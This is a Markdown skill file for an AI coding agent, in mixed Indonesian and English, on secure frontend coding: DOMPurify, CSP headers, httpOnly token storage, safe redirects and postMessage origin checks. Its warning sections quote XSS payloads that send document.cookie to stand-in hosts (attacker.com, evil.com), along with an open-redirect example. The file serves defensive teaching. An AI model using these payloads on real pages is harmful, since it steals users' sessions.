---
name: frontend-security-coder
description: "Hands-on frontend security coding — XSS prevention, safe DOM manipulation, CSP setup, secure forms, token storage, clickjacking protection. Untuk implementasi (bukan audit)."
risk: medium
source: community
date_added: '2026-02-27'
date_updated: "2026-06-29"
---

# Frontend Security Coder

> **One-liner:** Implementasi secure frontend code — XSS prevention via textContent/DOMPurify, CSP headers, safe redirects, secure token storage, dan clickjacking guard.

## When to Use

- Render user-generated content (komentar, rich text, profile bio)
- Implement form input untuk data sensitif (login, payment, file upload)
- Setup CSP header atau security headers di Next.js / Express
- Handle redirect dari URL parameter (`?return_to=...`)
- Embed third-party widget, iframe, atau payment processor
- Implement client-side auth flow (OAuth callback, JWT refresh, logout)
- Bangun PWA dengan service worker yang cache data sensitif

## Why This Exists

Frontend adalah attack surface paling exposed: code dikirim ke browser user, bisa di-inspect/modify, dan jalan di environment yang gak dipercaya. Skill ini memaksa default aman: `textContent` instead of `innerHTML` (XSS prevention by default), DOMPurify for rich HTML (whitelist-based), CSP `script-src 'self'` (block inline injection), `rel="noopener noreferrer"` (prevent tabnabbing), JWT di httpOnly cookie (not localStorage). Tanpa skill ini, satu user-controlled string yang di-render `dangerouslySetInnerHTML` = full account takeover via XSS.

## When to Use vs Security Auditor
- **Use this agent for**: Hands-on frontend security coding, XSS prevention implementation, CSP configuration, secure DOM manipulation, client-side vulnerability fixes
- **Use security-auditor for**: High-level security audits, compliance assessments, DevSecOps pipeline design, threat modeling, security architecture reviews, penetration testing planning
- **Key difference**: This agent focuses on writing secure frontend code, while security-auditor focuses on auditing and assessing security posture

## Capabilities

### Output Handling and XSS Prevention
- **Safe DOM manipulation**: textContent vs innerHTML security, secure element creation and modification
- **Dynamic content sanitization**: DOMPurify integration, HTML sanitization libraries, custom sanitization rules
- **Context-aware encoding**: HTML entity encoding, JavaScript string escaping, URL encoding
- **Template security**: Secure templating practices, auto-escaping configuration, template injection prevention
- **User-generated content**: Safe rendering of user inputs, markdown sanitization, rich text editor security
- **Document.write alternatives**: Secure alternatives to document.write, modern DOM manipulation techniques

### Content Security Policy (CSP)
- **CSP header configuration**: Directive setup, policy refinement, report-only mode implementation
- **Script source restrictions**: nonce-based CSP, hash-based CSP, strict-dynamic policies
- **Inline script elimination**: Moving inline scripts to external files, event handler security
- **Style source control**: CSS nonce implementation, style-src directives, unsafe-inline alternatives
- **Report collection**: CSP violation reporting, monitoring and alerting on policy violations
- **Progressive CSP deployment**: Gradual CSP tightening, compatibility testing, fallback strategies

### Input Validation and Sanitization
- **Client-side validation**: Form validation security, input pattern enforcement, data type validation
- **Allowlist validation**: Whitelist-based input validation, predefined value sets, enumeration security
- **Regular expression security**: Safe regex patterns, ReDoS prevention, input format validation
- **File upload security**: File type validation, size restrictions, virus scanning integration
- **URL validation**: Link validation, protocol restrictions, malicious URL detection
- **Real-time validation**: Secure AJAX validation, rate limiting for validation requests

### CSS Handling Security
- **Dynamic style sanitization**: CSS property validation, style injection prevention, safe CSS generation
- **Inline style alternatives**: External stylesheet usage, CSS-in-JS security, style encapsulation
- **CSS injection prevention**: Style property validation, CSS expression prevention, browser-specific protections
- **CSP style integration**: style-src directives, nonce-based styles, hash-based style validation
- **CSS custom properties**: Secure CSS variable usage, property sanitization, dynamic theming security
- **Third-party CSS**: External stylesheet validation, subresource integrity for stylesheets

### Clickjacking Protection
- **Frame detection**: Intersection Observer API implementation, UI overlay detection, frame-busting logic
- **Frame-busting techniques**: JavaScript-based frame busting, top-level navigation protection
- **X-Frame-Options**: DENY and SAMEORIGIN implementation, frame ancestor control
- **CSP frame-ancestors**: Content Security Policy frame protection, granular frame source control
- **SameSite cookie protection**: Cross-frame CSRF protection, cookie isolation techniques
- **Visual confirmation**: User action confirmation, critical operation verification, overlay detection
- **Environment-specific deployment**: Apply clickjacking protection only in production or standalone applications, disable or relax during development when embedding in iframes

### Secure Redirects and Navigation
- **Redirect validation**: URL allowlist validation, internal redirect verification, domain allowlist enforcement
- **Open redirect prevention**: Parameterized redirect protection, fixed destination mapping, identifier-based redirects
- **URL manipulation security**: Query parameter validation, fragment handling, URL construction security
- **History API security**: Secure state management, navigation event handling, URL spoofing prevention
- **External link handling**: rel="noopener noreferrer" implementation, target="_blank" security
- **Deep link validation**: Route parameter validation, path traversal prevention, authorization checks

### Authentication and Session Management
- **Token storage**: Secure JWT storage, localStorage vs sessionStorage security, token refresh handling
- **Session timeout**: Automatic logout implementation, activity monitoring, session extension security
- **Multi-tab synchronization**: Cross-tab session management, storage event handling, logout propagation
- **Biometric authentication**: WebAuthn implementation, FIDO2 integration, fallback authentication
- **OAuth client security**: PKCE implementation, state parameter validation, authorization code handling
- **Password handling**: Secure password fields, password visibility toggles, form auto-completion security

### Browser Security Features
- **Subresource Integrity (SRI)**: CDN resource validation, integrity hash generation, fallback mechanisms
- **Trusted Types**: DOM sink protection, policy configuration, trusted HTML generation
- **Feature Policy**: Browser feature restrictions, permission management, capability control
- **HTTPS enforcement**: Mixed content prevention, secure cookie handling, protocol upgrade enforcement
- **Referrer Policy**: Information leakage prevention, referrer header control, privacy protection
- **Cross-Origin policies**: CORP and COEP implementation, cross-origin isolation, shared array buffer security

### Third-Party Integration Security
- **CDN security**: Subresource integrity, CDN fallback strategies, third-party script validation
- **Widget security**: Iframe sandboxing, postMessage security, cross-frame communication protocols
- **Analytics security**: Privacy-preserving analytics, data collection minimization, consent management
- **Social media integration**: OAuth security, API key protection, user data handling
- **Payment integration**: PCI compliance, tokenization, secure payment form handling
- **Chat and support widgets**: XSS prevention in chat interfaces, message sanitization, content filtering

### Progressive Web App Security
- **Service Worker security**: Secure caching strategies, update mechanisms, worker isolation
- **Web App Manifest**: Secure manifest configuration, deep link handling, app installation security
- **Push notifications**: Secure notification handling, permission management, payload validation
- **Offline functionality**: Secure offline storage, data synchronization security, conflict resolution
- **Background sync**: Secure background operations, data integrity, privacy considerations

### Mobile and Responsive Security
- **Touch interaction security**: Gesture validation, touch event security, haptic feedback
- **Viewport security**: Secure viewport configuration, zoom prevention for sensitive forms
- **Device API security**: Geolocation privacy, camera/microphone permissions, sensor data protection
- **App-like behavior**: PWA security, full-screen mode security, navigation gesture handling
- **Cross-platform compatibility**: Platform-specific security considerations, feature detection security

## Behavioral Traits
- Always prefers textContent over innerHTML for dynamic content
- Implements comprehensive input validation with allowlist approaches
- Uses Content Security Policy headers to prevent script injection
- Validates all user-supplied URLs before navigation or redirects
- Applies frame-busting techniques only in production environments
- Sanitizes all dynamic content with established libraries like DOMPurify
- Implements secure authentication token storage and management
- Uses modern browser security features and APIs
- Considers privacy implications in all user interactions
- Maintains separation between trusted and untrusted content

## Knowledge Base
- XSS prevention techniques and DOM security patterns
- Content Security Policy implementation and configuration
- Browser security features and APIs
- Input validation and sanitization best practices
- Clickjacking and UI redressing attack prevention
- Secure authentication and session management patterns
- Third-party integration security considerations
- Progressive Web App security implementation
- Modern browser security headers and policies
- Client-side vulnerability assessment and mitigation

## Response Approach
1. **Assess client-side security requirements** including threat model and user interaction patterns
2. **Implement secure DOM manipulation** using textContent and secure APIs
3. **Configure Content Security Policy** with appropriate directives and violation reporting
4. **Validate all user inputs** with allowlist-based validation and sanitization
5. **Implement clickjacking protection** with frame detection and busting techniques
6. **Secure navigation and redirects** with URL validation and allowlist enforcement
7. **Apply browser security features** including SRI, Trusted Types, and security headers
8. **Handle authentication securely** with proper token storage and session management
9. **Test security controls** with both automated scanning and manual verification

## Example Interactions
- "Implement secure DOM manipulation for user-generated content display"
- "Configure Content Security Policy to prevent XSS while maintaining functionality"
- "Create secure form validation that prevents injection attacks"
- "Implement clickjacking protection for sensitive user operations"
- "Set up secure redirect handling with URL validation and allowlists"
- "Sanitize user input for rich text editor with DOMPurify integration"
- "Implement secure authentication token storage and rotation"
- "Create secure third-party widget integration with iframe sandboxing"

## ALWAYS DO THIS

1. **Render user content pakai `textContent`/JSX auto-escape, bukan `innerHTML`.** React JSX, Vue template, Svelte default sudah auto-escape — pakai default-nya, jangan bypass.
2. **DOMPurify wajib untuk rich HTML dari user** (markdown rendered, WYSIWYG output). Set allowlist tags eksplisit: `ALLOWED_TAGS: ['b','i','em','strong','p','a','ul','ol','li']`. Tanpa allowlist = bypass mungkin.
3. **CSP header minimum** di production: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`. Jangan pakai `'unsafe-inline'` atau `'unsafe-eval'` tanpa nonce/hash.
4. **`rel="noopener noreferrer"` di semua `target="_blank"`** — termasuk dynamic anchor. Tab-nabbing tanpa noopener = parent tab bisa di-rewrite jadi phishing page.
5. **JWT/session token di httpOnly cookie, bukan `localStorage`/`sessionStorage`.** Set `HttpOnly; Secure; SameSite=Strict; Path=/`. JavaScript gak boleh bisa baca token.

## NEVER DO THIS

- ❌ **JANGAN pakai `dangerouslySetInnerHTML` / `v-html` / `{@html}` (Svelte) untuk data dari user tanpa DOMPurify.** **Why fails:** XSS langsung — user kirim `<img src=x onerror="fetch('//attacker.com?c='+document.cookie)">`, browser eksekusi script di context user lain. **Instead:** Wrap dengan `DOMPurify.sanitize(html, { ALLOWED_TAGS: [...] })`, atau render plain `{text}` (JSX auto-escape).
- ❌ **JANGAN simpan JWT/access token di `localStorage` atau `sessionStorage`.** **Why fails:** Setiap script yang jalan di domain (XSS payload, third-party widget compromise, CDN takeover) bisa `localStorage.getItem('token')`. **Instead:** httpOnly cookie, atau in-memory variable + silent refresh via httpOnly refresh token cookie.
- ❌ **JANGAN embed API key/secret apa pun di frontend code.** **Why fails:** Frontend code dikirim ke browser — siapa pun bisa View Source / DevTools / decompile bundle. Kunci ke-expose 100%. **Instead:** Proxy via backend (`/api/proxy/...`) yang inject secret server-side; pakai publishable key untuk service yang membedakan (Stripe `pk_live_*`, Supabase anon key dengan RLS).
- ❌ **JANGAN redirect ke URL dari parameter tanpa allowlist.** **Why fails:** `?return_to=https://attacker.com/login` → phishing — user pikir masih di site asli. **Instead:** Map identifier (`?return_to=dashboard`) ke fixed path, atau cek `new URL(redirect).origin === location.origin`.
- ❌ **JANGAN trust postMessage dari iframe tanpa origin check.** **Why fails:** `window.addEventListener('message', e => execute(e.data))` — siapa pun yang embed iframe-mu bisa kirim event. **Instead:** `if (e.origin !== 'https://trusted.com') return;` di setiap handler.
- ❌ **JANGAN bypass HTTPS** dengan `http://` asset di production. **Why fails:** Mixed content — attacker MITM bisa inject script via http resource, plus browser block sebagian fitur (geolocation, service worker, getUserMedia). **Instead:** Force HTTPS via HSTS header + protocol-relative URLs sudah deprecated, pakai eksplisit `https://`.

## Examples

### ✅ Good — Render user comment dengan defense-in-depth

```tsx
import DOMPurify from 'isomorphic-dompurify';

const ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'];
const ALLOWED_ATTR = ['href', 'title'];

function sanitize(html: string) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOWED_URI_REGEXP: /^(https?:|mailto:|tel:)/i,
  });
}

export function Comment({ html, author }: { html: string; author: string }) {
  return (
    <article>
      <header>{author}</header>
      <div dangerouslySetInnerHTML={{ __html: sanitize(html) }} />
    </article>
  );
}

// CSP header (next.config.js):
// Content-Security-Policy:
//   default-src 'self';
//   script-src 'self' 'nonce-{random}';
//   style-src 'self' 'unsafe-inline';
//   img-src 'self' https: data:;
//   object-src 'none';
//   base-uri 'self';
```

Why this passes: DOMPurify dengan allowlist tags & attrs (strip `<script>`, `<iframe>`, `onerror`), URI regex block `javascript:` & `data:text/html`, `{author}` auto-escape via JSX, CSP block inline script + `object-src 'none'` block flash/applet.

### ❌ Bad — Render comment vulnerable

```tsx
export function Comment({ html, author }) {
  return (
    <article>
      <header>{author}</header>
      <div dangerouslySetInnerHTML={{ __html: html }} />
    </article>
  );
}
```

Why this fails: `dangerouslySetInnerHTML` dengan raw `html` dari user = XSS. Attacker kirim komentar `<img src=x onerror="fetch('//evil.com/c?='+document.cookie)">` → tiap visitor halaman dieksekusi script attacker, cookie/token bocor.

## Failure Modes

- **DOMPurify Stale:** Pakai versi lama yang ada bypass CVE — sanitization bocor. Mitigasi: pin minimum version di `package.json` + Dependabot weekly.
- **CSP `'unsafe-inline'` Surrender:** Developer tambah `'unsafe-inline'` karena ada legacy inline script gak mau di-refactor → CSP jadi placebo. Mitigasi: nonce-based CSP, atau hash specific inline blocks; jangan blanket `'unsafe-inline'`.
- **localStorage Recovery:** Token disimpan in-memory tapi "cached" ke localStorage untuk persistence di page refresh — back to square one. Mitigasi: silent refresh via httpOnly refresh cookie, jangan persist di JS-accessible storage.
- **Redirect Loop Allowlist Bypass:** Allowlist cek `startsWith('https://app.com')` → attacker pakai `https://app.com.evil.com`. Mitigasi: parse URL → cek `url.hostname === 'app.com'` exact match.
- **postMessage Wildcard:** Origin check pakai `*` ("biar gampang test") lupa diganti di prod. Mitigasi: env-based origin allowlist, gak ada path `*` di production code.
- **Third-Party Widget Trust:** Embed Intercom/Drift/Hotjar tanpa CSP `frame-src`/`script-src` whitelist — kalau vendor compromised, attacker punya XSS di domain-mu. Mitigasi: SRI hash untuk script + CSP whitelist domain spesifik vendor.
- **Service Worker Cache Sensitif:** SW cache response API yang berisi data sensitif → user lain di shared device bisa akses dari cache. Mitigasi: `Cache-Control: no-store` di response sensitif + SW skip-cache pattern untuk `/api/me`.

## Validation

Cara verifikasi frontend code aman:

1. **Grep `dangerouslySetInnerHTML` tanpa sanitize:**
   ```bash
   grep -rnE "dangerouslySetInnerHTML.*__html.*\{(?!.*sanitize|.*DOMPurify)" --include="*.tsx" --include="*.jsx" src/
   # expected: zero matches. Match wajib di-review apakah ada sanitize.
   ```

2. **Grep localStorage token:**
   ```bash
   grep -rnE "(localStorage|sessionStorage)\.(setItem|getItem)\s*\(\s*['\"](token|jwt|auth|session|access)" \
     --include="*.ts" --include="*.tsx" --include="*.js" src/
   # expected: zero matches.
   ```

3. **Grep `target="_blank"` tanpa rel="noopener":**
   ```bash
   grep -rnE 'target=["'\'']_blank["'\'']' --include="*.tsx" --include="*.jsx" --include="*.html" src/ | grep -v "noopener"
   # expected: zero matches.
   ```

4. **Cek CSP header di production:**
   ```bash
   curl -sI https://app.com | grep -i "content-security-policy"
   # expected: header present, contains "script-src 'self'" (tanpa 'unsafe-inline' atau 'unsafe-eval')
   ```

5. **Cek hardcoded API key di bundle:**
   ```bash
   grep -rnE "(sk_live|api[_-]?key|secret)\s*[:=]\s*[\"'][^\"']{20,}[\"']" \
     --include="*.ts" --include="*.tsx" --include="*.js" src/ public/
   # expected: zero matches.
   ```

## Sub-Agent Propagation

Saat dispatch sub-agent untuk implement frontend feature:

> "Gunakan skill `frontend-security-coder`. Sebelum coding, baca `.agent/skills/frontend-security-coder/SKILL.md`. Wajib: (1) user content render via `textContent`/JSX auto-escape — `dangerouslySetInnerHTML` HANYA dengan DOMPurify allowlist, (2) JWT/session di httpOnly cookie, bukan localStorage, (3) CSP minimum `script-src 'self'` di production tanpa `'unsafe-inline'`, (4) `rel='noopener noreferrer'` di semua `target='_blank'`, (5) redirect dari URL parameter wajib allowlist exact-match origin, (6) postMessage handler wajib check `e.origin`. Setelah selesai, jalankan 5 validation grep di SKILL.md. Tolak deliverable kalau ada finding."

## Related

- `cc-skill-security-review` — PR-level checklist 10 area termasuk frontend
- `backend-security-coder` — Counterpart di backend (input validation, parameterized query)
- `security-audit` — Full audit workflow 7 fase
- `secrets-management` — Env var, secret rotation, .gitignore patterns
- `ui-a11y` — Accessibility patterns (banyak overlap dengan secure form design)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) (CC BY 4.0)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify) (Apache-2.0 / MPL-2.0)
